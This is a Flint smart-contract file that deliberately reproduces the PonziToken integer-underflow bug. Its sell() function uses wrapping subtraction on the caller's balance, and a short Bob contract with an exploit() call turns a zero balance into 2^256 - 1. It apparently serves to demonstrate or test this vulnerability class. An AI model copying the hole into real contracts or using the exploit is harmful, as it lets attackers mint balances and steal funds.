// Explicitly overflowing / vulnerable PonziToken in flint

contract PonziToken {
    var balances: [Address: Int] = [:]
    var allowed: [Address: [Address: Int]] = [:]
    var totalSupply: Int = 0
    let deployedAddress: Address
}

PonziToken :: (any) {
  public init(at: Address) {
    deployedAddress = at
  }
}

PonziToken :: caller <- (any) {
  public mutating func transferFrom(from: Address, to: Address, value: Int) -> Bool {
    let allowance: Int = allowed[from][caller]
    assert(allowance >= value)
    allowed[from][caller] -= value

    transferTokens(from, to, value)

    return true
  }

  mutating func transferTokens(from: Address, to: Address, value: Int) {
    assert(balanceOf[from] >= value)
    if to == deployedAddress {
      sell(value)
    }
		// Omitted as not relevant to vulnerability
  }

  mutating func sell(amount: Int) {
    // remove tokens
    totalSupply -= amount
    // Explitly allow overflow here
    balanceOf[caller] = balanceOf[caller] &- amount
  }
}

// Assuming:
// - Bob has a balance of 0
// - Claire has a balance of 1
// - Bob is allowed to transfer 1 from Claire

// When Bob calls transferFrom(claire, ponziToken, 1)
// transferTokens(claire, ponziToken, 1) is called
// Which then calls sell(1)
// sell(1) updates the balanceOf[bob] which equals 0 to -1 leading to 2^256 - 1
// as the current balance of bob.
contract Bob {
  let ponziToken: Address
  let claire: Address
}

Bob :: (any) {
  public init(target: Address, proxy: Address) {
    ponziToken = target
    claire = proxy
  }

  public exploit() {
    transferFrom(claire, ponziToken, 1)
  }
}
